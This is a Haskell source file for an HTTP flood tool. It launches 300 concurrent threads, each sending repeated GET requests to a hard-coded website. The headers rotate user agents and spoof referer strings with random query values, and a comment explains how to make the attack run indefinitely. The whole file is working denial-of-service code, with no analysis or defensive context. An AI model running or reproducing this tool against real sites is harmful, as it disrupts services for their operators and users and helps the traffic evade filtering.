import Control.Concurrent (
  forkIO, MVar, newEmptyMVar, putMVar, takeMVar)
import Control.Exception.Base (catch)
import Control.Monad (replicateM)
import Network.HTTP
import Network.HTTP.Base
import Network.HTTP.Headers
import System.IO.Error (IOError)
import System.Random

referrers = [
  "http://www.usatoday.com/search/results?q=",
  "http://engadget.search.aol.com/search?q="]

userAgents = [
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
  "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
  "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
  "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"]


randomChoice :: [a] -> IO a
randomChoice a = (!!) a <$> randomRIO (0, length a - 1)

randomStr :: Int -> IO String
randomStr n = take n <$> randomRs ('a','z') <$> newStdGen

-- to attack infinitely, simply call attack (-1)
attack :: MVar () -> Int -> String -> IO ()
attack done 0 _ = putMVar done ()
attack done times url =
  let nextTimes = (if times < 0
                   then - 1 else times - 1)
      onDone = attack done nextTimes url
      handler e = do putStrLn $ "Exception" ++ show e
                     onDone in
    flip catch (handler :: IOError -> IO ()) $ do
      userAgent <- randomChoice userAgents
      referer <- randomChoice referrers
      q <- randomStr 15
      response <- simpleHTTP (getRequest url) {
          rqHeaders=[Header HdrUserAgent userAgent,
                     Header HdrReferer $ referer ++ "?q=" ++ q]}
      putStrLn $ "jobs left: "  ++ (show times)
      -- (fmap (take 100) . getResponseBody $ response) >>= putStrLn
      onDone
      

main :: IO ()
main = do
  let nThreads = 300
      nAttacks = 100
  done <- newEmptyMVar
  threadIds <- replicateM nThreads $ do
    forkIO (attack done nAttacks "http://waynedev.me/")
  replicateM nThreads $ takeMVar done
  return ()
